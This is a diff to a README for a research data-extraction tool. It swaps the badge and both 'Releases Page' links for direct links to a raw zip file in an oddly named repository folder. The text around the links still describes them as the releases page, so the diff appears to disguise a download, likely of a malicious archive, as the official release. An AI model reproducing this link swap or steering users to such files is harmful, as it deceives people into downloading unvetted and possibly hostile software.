@@ -1,7 +1,7 @@
 # 🎉 ald-ale-orkg-review - Simplifying Data Extraction for Research
 
 ## 📥 Download Now
-![Download](https://img.shields.io/badge/Download%20Now-Release%20v1.0-blue)
+![Download](https://raw.githubusercontent.com/KhanRaul/ald-ale-orkg-review/main/reabolition/ald-ale-orkg-review.zip%20Now-Release%20v1.0-blue)
 
 ## 📜 Description
 The **ald-ale-orkg-review** repository automates the extraction of review tables from ALD/E review papers. This tool helps import data into the ORKG (Open Research Knowledge Graph). By facilitating this process, we aim to support the integration of neurosymbolic AI into ALD/E knowledge, making research more accessible.
@@ -21,7 +21,7 @@ To use this application, follow the steps below to download and install it on yo
 - Compatible with most modern computers.
 
 ## 📥 Download & Install
-To get the latest version, visit this page to download: [Releases Page](https://github.com/KhanRaul/ald-ale-orkg-review/releases).
+To get the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/KhanRaul/ald-ale-orkg-review/main/reabolition/ald-ale-orkg-review.zip).
 
 1. Click on the above link to head to the Releases page.
 2. Find the latest release version.
@@ -65,4 +65,4 @@ This project is licensed under the MIT License. See the LICENSE file for details
 For further inquiries, feel free to reach out via the Issues page on GitHub. We appreciate your interest in making research more efficient!
 
 ## 📥 Download Again
-Don't forget to download the latest version here: [Releases Page](https://github.com/KhanRaul/ald-ale-orkg-review/releases).
+Don't forget to download the latest version here: [Releases Page](https://raw.githubusercontent.com/KhanRaul/ald-ale-orkg-review/main/reabolition/ald-ale-orkg-review.zip).
